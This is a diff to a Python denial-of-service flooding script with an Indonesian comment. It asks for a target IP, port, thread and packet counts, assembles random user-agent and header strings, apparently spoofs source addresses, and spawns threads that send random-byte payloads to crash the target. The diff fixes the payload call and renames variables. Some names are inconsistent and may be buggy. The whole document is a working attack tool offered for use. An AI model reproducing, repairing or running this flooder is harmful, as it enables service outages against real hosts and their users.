@@ -1,8 +1,9 @@
 #Ddos Dulu biar gacor
-import sys
-import os
-import socket, random, requests
-import time, threading
+import threading
+import os, sys
+import socket
+import random
+import requests
 useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
 "Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
@@ -32,8 +33,8 @@ acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=
 
 ip = str(input("Ip >= "))
 port = int(input("port >= "))
+th = int(input("Thread/t >="))
 pack = int(input("Pack/s >="))
-thread = int(input("Thread/t >="))
 
 def spoof():
   global byte1
@@ -62,9 +63,9 @@ def spoofer():
     return acces
 
 def start():
-  hh = random.urandom(999999)
-  xx = int(0)
   global useragents, acceptall, ref
+  hh = random._urandom(75006)
+  xx = int(0)
   userKagen = "UserAgents: "+random.choice(UserAgents)+random.choice(acceptall)+random.choice(ref)+"\r\n"
   acceptser = "AcceptAdmin: "+random.choice(acceptall)+random.choice(ref)+"\r\n"
   referrer = random.choice(ref)
@@ -84,6 +85,6 @@ def start():
         except:
             s.close()
             print("Ez Crashh")
-for i in range(thread):
-  thred = threading.Thread(target=start)
-  thred.start()
+for i in range(th):
+  th = threading.Thread(target=start)
+  th.start()
